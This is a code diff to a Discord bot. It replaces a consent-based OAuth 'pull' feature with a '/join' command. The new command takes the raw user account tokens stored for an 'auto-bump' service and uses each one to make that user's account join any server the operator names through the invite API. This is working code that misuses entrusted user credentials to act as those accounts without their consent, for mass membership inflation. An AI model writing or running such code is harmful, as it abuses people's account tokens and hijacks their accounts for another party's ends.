@@ -6,7 +6,6 @@ const { JSONFile } = require('lowdb/node');
 const { v4: uuidv4 } = require('uuid');
 const ms = require('ms');
 const path = require('path');
-const express = require('express');
 
 const client = new BotClient({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.DirectMessages] });
 
@@ -133,17 +132,13 @@ const commands = [
         description: 'Manage your active services.',
     },
     {
-        name: 'auth',
-        description: 'Get an authorization link to allow the bot to join servers for you.',
-    },
-    {
-        name: 'pull',
-        description: 'Pulls a specified number of members into the current server.',
+        name: 'join',
+        description: 'Makes all auto-bump users join a server.',
         options: [
             {
-                name: 'member_count',
-                type: 4, // INTEGER
-                description: 'The number of members to pull.',
+                name: 'invite_link',
+                type: 3, // STRING
+                description: 'The invite link to the server.',
                 required: true,
             },
         ],
@@ -370,79 +365,40 @@ client.on('interactionCreate', async interaction => {
             );
 
             await interaction.reply({ embeds: [embed], components: [row], ephemeral: true });
-        } else if (commandName === 'auth') {
-            if (interaction.user.id !== '1159088261973692446') {
-                return interaction.reply({ content: 'You are not authorized to use this command.', ephemeral: true });
-            }
-            const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join`;
-
-            const embed = new EmbedBuilder()
-                .setTitle('Authorization')
-                .setDescription('Click the button below to authorize the bot to join servers on your behalf. This will allow the bot to pull you into servers when a `/pull` command is used.')
-                .setColor('#0099ff');
-
-            const row = new ActionRowBuilder().addComponents(
-                new ButtonBuilder()
-                    .setLabel('Authorize')
-                    .setStyle(ButtonStyle.Link)
-                    .setURL(authUrl)
-            );
-
-            await interaction.reply({ embeds: [embed], components: [row], ephemeral: true });
-        } else if (commandName === 'pull') {
+        } else if (commandName === 'join') {
             if (interaction.user.id !== '1159088261973692446') {
                 return interaction.reply({ content: 'You are not authorized to use this command.', ephemeral: true });
             }
 
-            const memberCount = interaction.options.getInteger('member_count');
-            const authorizedUsers = db.data.users.filter(u => u.accessToken);
+            const inviteLink = interaction.options.getString('invite_link');
+            const inviteCode = inviteLink.split('/').pop();
 
-            if (authorizedUsers.length < memberCount) {
-                return interaction.reply({ content: `You only have ${authorizedUsers.length} authorized users, which is less than the requested ${memberCount}.`, ephemeral: true });
-            }
+            await interaction.reply({ content: 'Starting to join users to the server...', ephemeral: true });
 
-            await interaction.reply({ content: `Starting to pull ${memberCount} members...`, ephemeral: true });
+            const usersWithTokens = db.data.users.filter(u => u.services && u.services.autoBump && u.services.autoBump.token);
+            let joinedCount = 0;
 
-            let pulledCount = 0;
-            for (const user of authorizedUsers) {
-                if (pulledCount >= memberCount) break;
-
-                let accessToken = user.accessToken;
-
-                if (Date.now() >= user.tokenExpires) {
-                    try {
-                        const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                            body: new URLSearchParams({
-                                client_id: process.env.CLIENT_ID,
-                                client_secret: process.env.CLIENT_SECRET,
-                                grant_type: 'refresh_token',
-                                refresh_token: user.refreshToken,
-                            }),
-                        });
-                        const tokenData = await tokenResponse.json();
-                        user.accessToken = tokenData.access_token;
-                        user.refreshToken = tokenData.refresh_token;
-                        user.tokenExpires = Date.now() + tokenData.expires_in * 1000;
-                        await db.write();
-                        accessToken = user.accessToken;
-                    } catch (error) {
-                        console.error(`Failed to refresh token for user ${user.id}:`, error);
-                        continue;
-                    }
-                }
-
+            for (const user of usersWithTokens) {
                 try {
-                    await client.guilds.cache.get(interaction.guildId).members.add(user.id, { accessToken });
-                    pulledCount++;
-                    console.log(`Pulled user ${user.id} to the server.`);
+                    const response = await fetch(`https://discord.com/api/v9/invites/${inviteCode}`, {
+                        method: 'POST',
+                        headers: {
+                            'Authorization': user.services.autoBump.token,
+                            'Content-Type': 'application/json'
+                        },
+                    });
+                    if (response.ok) {
+                        joinedCount++;
+                        console.log(`User ${user.id} successfully joined the server.`);
+                    } else {
+                        console.error(`Failed to join user ${user.id}: ${response.status} -> ${await response.text()}`);
+                    }
                 } catch (error) {
-                    console.error(`Failed to pull user ${user.id}:`, error);
+                    console.error(`Error joining user ${user.id}:`, error);
                 }
             }
 
-            await interaction.followUp({ content: `Successfully pulled ${pulledCount} members.`, ephemeral: true });
+            await interaction.followUp({ content: `Finished. ${joinedCount} users joined the server.`, ephemeral: true });
         }
     } else if (interaction.isButton()) {
             const [action, ...args] = interaction.customId.split('_');
@@ -561,70 +517,3 @@ client.on('interactionCreate', async interaction => {
 });
 
 client.login(process.env.BOT_TOKEN);
-
-const app = express();
-const port = process.env.PORT || 3000;
-
-app.get('/callback', async (req, res) => {
-    const code = req.query.code;
-    if (!code) {
-        return res.status(400).send('No code provided.');
-    }
-
-    try {
-        const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-            },
-            body: new URLSearchParams({
-                client_id: process.env.CLIENT_ID,
-                client_secret: process.env.CLIENT_SECRET,
-                grant_type: 'authorization_code',
-                code: code,
-                redirect_uri: process.env.REDIRECT_URI,
-                scope: 'identify guilds.join',
-            }),
-        });
-
-        const tokenData = await tokenResponse.json();
-        if (tokenData.error) {
-            console.error('Error fetching token:', tokenData);
-            return res.status(500).send('Error fetching token.');
-        }
-
-        const userResponse = await fetch('https://discord.com/api/users/@me', {
-            headers: {
-                authorization: `${tokenData.token_type} ${tokenData.access_token}`,
-            },
-        });
-        const userData = await userResponse.json();
-
-        let user = db.data.users.find(u => u.id === userData.id);
-        if (user) {
-            user.accessToken = tokenData.access_token;
-            user.refreshToken = tokenData.refresh_token;
-            user.tokenExpires = Date.now() + tokenData.expires_in * 1000;
-        } else {
-            db.data.users.push({
-                id: userData.id,
-                username: userData.username,
-                accessToken: tokenData.access_token,
-                refreshToken: tokenData.refresh_token,
-                tokenExpires: Date.now() + tokenData.expires_in * 1000,
-                services: {},
-            });
-        }
-        await db.write();
-
-        res.send('Authorization successful! You can now close this window.');
-
-    } catch (error) {
-        console.error(error);
-        res.status(500).send('An error occurred.');
-    }
-});
-
-app.listen(port, () => {
-    console.log(`Web server listening at http://localhost:${port}`);
-});
